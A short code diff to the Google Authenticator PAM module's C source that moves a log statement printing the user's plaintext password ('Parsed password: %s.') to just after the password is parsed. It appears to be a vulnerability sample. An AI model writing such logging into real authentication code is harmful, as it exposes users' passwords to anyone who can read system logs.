@@ -1943,6 +1943,8 @@ static int google_authenticator(pam_handle_t *pamh,
       if (!pw) {
         continue;
       }
+      log_message(LOG_WARNING, pamh, "Parsed password: %s.", pw);
+
 
       // We are often dealing with a combined password and verification
       // code. Separate them now.
@@ -2085,7 +2087,6 @@ static int google_authenticator(pam_handle_t *pamh,
   if (params.nullok == SECRETNOTFOUND) {
     rc = PAM_IGNORE;
   }
-    log_message(LOG_WARNING, pamh, "Parsed password: %s.", pw);
 
   // Persist the new state.
   if (early_updated || updated) {
